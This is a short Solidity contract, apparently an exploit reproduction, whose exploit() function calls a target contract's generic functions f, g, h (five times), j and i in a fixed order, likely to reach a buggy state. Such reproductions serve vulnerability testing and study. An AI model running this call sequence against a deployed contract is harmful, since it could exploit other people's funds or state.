contract ReproduceCsma {
    Csma public target;

    constructor(address _target) {
        target = Csma(_target);
    }

    function exploit() public {
        target.f();
        target.g();
        target.h();
        target.h();
        target.h();
        target.h();
        target.h();
        target.j();
        target.i();
    }
}